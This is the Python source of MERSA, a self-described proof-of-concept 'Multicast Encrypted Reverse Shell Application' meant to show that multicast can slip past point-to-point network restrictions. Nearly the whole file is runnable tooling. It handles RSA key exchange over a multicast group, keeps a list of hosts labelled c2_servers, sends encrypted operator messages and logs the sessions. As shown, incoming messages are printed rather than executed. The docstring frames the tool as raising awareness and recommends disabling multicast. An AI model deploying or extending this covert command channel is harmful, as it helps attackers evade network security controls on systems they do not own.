"""\
   o       .                         o      .
                      .
  .   dBBBBBBb  dBBBBP dBBBBBb  dBBBBP dBBBBBb 
     dB'   dB' dB     dB  dBP BP'          'BB 
    dB'dB'dB' dBBP   dBBBBP' 'BBBBb   dBBBPBB  .
   dB'dB'dB' dBP    dBP  BB     dBP  dBP   BB 
  dB'dB'dB' dBBBBP dBP  dB  dBBBBP' 'dBBBBBB 
     .                                          
                                .
         .         o    
                                        .
  .      |                
       --o--      MERSA-FULLY      .
         |                                   o
 o             .

Multicast Encrypted Reverse Shell Application (MERSA) is a POC tool that demonstrates how multicast can be used to bypass point-to-point restrictions on secured network.

MERSA is a non-vendor specific vulnerability that undermines network security policies by operating on multicast. Multicast uses IGMP (L2) or PIM (L3), depending on the type of network, to route multicast traffic. As a result, some networks' security policies can be bypassed due to gaps in the security controls for multicast routing.

Multicast is often forgetten about and rarely utilized within most networks. As a result, it can be overlooked as a vulnerability. The goal of MERSA is to bring attention to the existing security gaps in networks that have multicast enabled. The best way to mitigate any risks against multicast, is to disable it in the router configuration file.\
"""

import socket
import sys
import time
import os.path
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def encrypt(plaintext, public_key):
  cipher = PKCS1_OAEP.new(public_key)
  ciphertext = cipher.encrypt(bytes(plaintext))
  return ciphertext

def decrypt(ciphertext, private_key):
  cipher = PKCS1_OAEP.new(private_key)
  return cipher.decrypt(ciphertext)

def IPv4LAN():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.connect(("255.255.255.255", 1))
    IP = s.getsockname()[0]
  except Exception:
    IP = "127.0.0.1"
  finally:
    s.close()
  return IP

def multicast_recv(port, address="224.0.0.251", ttl=5, hops=255):
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  try:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  except AttributeError:
    pass
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops) 
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
  sock.bind((address, port))
  host = IPv4LAN()
  sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_IF, socket.inet_aton(host))
  sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(address) + socket.inet_aton(host))
  sock.settimeout(ttl)
  return sock

def multicast_send(hops=255):
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops)
  return sock

def display_hosts():
  servers = list(c2_servers.keys())
  for serv in c2_servers.keys():
    print(f"+ -- =[ OPTION: {servers.index(serv)}{' '*(23-len(serv))}{serv} ]")
  print()

def cmd_mersa(public_key, multicast_group="224.0.0.251", multicast_port=1514, keyport=1667):
  """Command line interface for interacting with hosts.
  """
  print("     =[ Type 'discover' to find hosts.   ]")
  soc = multicast_send()
  while True:
    display_hosts()
    while True:
      servers = list(c2_servers.keys())
      try:
        opt = input("MERSA(host-id) % ").strip()
        if opt.lower() == "discover":
          soc.sendto(public_key, (multicast_group, keyport))
          mersalog.entry("",(IPv4LAN(),keyport),0)
        elif opt in servers:
          break
        elif opt.isdigit():
          opt = servers[int(opt)]
          break
        elif opt.lower() == "store":
          mersalog.store()
          print("[MLOG] Interaction logfile saved.\n")
        else:
          display_hosts()
      except KeyboardInterrupt:
        soc.close()
        sys.exit()
      except Exception as e:
        pass
    
    plain = input(f"MERSA({opt}) % ").encode()
    ciphertext = encrypt(plain, c2_servers[opt])
    soc.sendto(ciphertext, (multicast_group, multicast_port))
    mersalog.entry(plain,(IPv4LAN(),multicast_port),4,opt)
    print()
    
  soc.close()

def listen_mersa(private_key, multicast_port=1514):
  """Automatically attempts to decrypt messages using the private key.
  """
  soc = multicast_recv(multicast_port)
  while True:
    decrypted = False
    try:
      data, addr = soc.recvfrom(2048)
      if addr[0] != IPv4LAN():
        plaintext = decrypt(data, private_key)
        print(f"\n\n[MSG-RECV][{addr[0]}] {plaintext}")
        decrypted = True
        mersalog.entry(plaintext,addr,5)
      if decrypted == False and addr[0] != IPv4LAN():
        mersalog.entry(data,addr,6)
    except KeyboardInterrupt:
      soc.close()
      break
    except:
      pass

def listen_key(public_key, multicast_group="224.0.0.251", keyport=1667):
  """Exchanges public keys with other hosts.
  """
  soc = multicast_recv(keyport)
  sock = multicast_send()
  while True:
    try:
      data, addr = soc.recvfrom(2048)
      if b"---END PUBLIC KEY---" in data and addr[0] != IPv4LAN():
        if b"NOREPLY--" not in data:
          sock.sendto(b"NOREPLY" + public_key, (multicast_group, keyport))
          mersalog.entry("",addr,1)
          mersalog.entry("",(IPv4LAN(),keyport),2)
        if addr[0] not in c2_servers.keys():
          pub = RSA.importKey(data.replace(b"NOREPLY--",b"--"))
          c2_servers.update({addr[0]:pub})
          print(f"\n\n[JOIN] {addr[0]} has joined.")
          mersalog.entry("",addr,3)
    except KeyboardInterrupt:
      soc.close()
      break
    except Exception as e:
      pass

def laplace(demon, parm=None, wait=False, prefix="Ld_"):
  """Daemon handler for creating threads.
  """
  while threading.active_count() > 150:
    time.sleep(0.25)
  if callable(demon):
    if wait != True:
      if type(parm) in [type([]), type(())]:
        d = threading.Thread(target=demon, args=parm)
      elif type(parm) in [type(1), type(""), type(1.0), type(True)]:
        d = threading.Thread(target=demon, args=(parm,))
      else:
        d = threading.Thread(target=demon)
      d.daemon = True
      dname = f"{prefix}{demon.__name__}"
      if dname in str(threading._active):
        if "y" in input(f"[Laplace] {dname} is already running, are you sure you would like to continue? [y/n] ").lower():
          d.setName(dname)
          d.start()
      else:
        d.start()
    else:
      if parm != None:
        demon(parm)
      else:
        demon()
  else:
    print(f"[Laplace] {demon} is not callable. Consult your python spellbook.")

class MLOG(object):
  
  def __init__(self):
    self.registry = ""
  
  def entry(self, data, address, logtype, forward=None):
    entry_time = time.strftime("[%X%p-%d/%m/%y] ", time.localtime())
    
    if address[0] == IPv4LAN():
      entry_time = "[H]"+entry_time
    else:
      entry_time = "[C]"+entry_time
    
    if logtype == 0x00:
      event = "Discovery OUT => "
      entry_data = "PROBE\n"
    elif logtype == 0x01:
      event = "Discovery IN <= "
      entry_data = "PROBE\n"
    elif logtype == 0x02:
      event = "Acknowledgement OUT => "
      entry_data = "NOREPLY\n"
    elif logtype == 0x03:
      event = "Acknowledged IN <= "
      entry_data = "NOREPLY\n"
    elif logtype == 0x04:
      event = "Sent Message: "
      if type(forward) == type(""):
        entry_data = f"{str(data)} => {forward}\n"
      else:
        entry_data = f"{str(data)}\n"
    elif logtype == 0x05:
      event = "Decrypted: "
      entry_data = f"{str(data)[:32]}\n"
    elif logtype == 0x06:
      event = "Unable To Decrypt "
      entry_data = f"'{str(data)[2:18]}...'\n"
    else:
      event = "UNKNOWN ERROR "
      entry_data = f"{str(data)[2:18]}...\n"
    
    source = f"{address[0]}:{address[1]}] "
    source = "[" + f"{source:>23}"
    
    full_entry = "".join((entry_time, source, event, entry_data))
    
    self.registry += full_entry
  
  def store(self, name=None):
    if name == None:
      name = "log_"+time.ctime().replace(" ","")
    with open(name,"w") as log:
      log.write("Multicast Encrypted Reverse Shell Application (MERSA) Log\n")
      log.write(f"Save-Date: {time.ctime()}\n\n")
      log.write("[H]ost / [C]lient | Time |      SRC:PORT       |    Event    |    DATA    |   *DST    |\n")
      log.write(self.registry)

def MERSA(private_key, public_key):
  """Display banner and thread startup.
  """
  print(__doc__.split("\n\n")[0])
  laplace(listen_mersa, (private_key,))
  laplace(listen_key, (public_key,))
  cmd_mersa(public_key)

c2_servers = {}
mersalog = MLOG()

if __name__ == "__main__":
  
  if len(sys.argv) <= 1:
    pemfile = "./private.pem"
  else:
    pemfile = sys.argv[1]
  
  if not os.path.isfile("./private.pem"):
    if "y" in input("Generate new RSA private key? [y/n] ").lower():
      private = RSA.generate(2048)
      with open("./private.pem","wb") as p:
        p.write(private.exportKey())
    else:
      sys.exit()
  else:
    with open("./private.pem") as p:
      private = RSA.importKey(p.read())
  
  public = private.publickey().exportKey()
  
  if threading.active_count() > 1:
    print(" .   Attempting to exercise %s daemons...    .\n"%(threading.active_count()-1))
    KeyboardInterrupt()
    time.sleep(5)
  
  MERSA(private, public)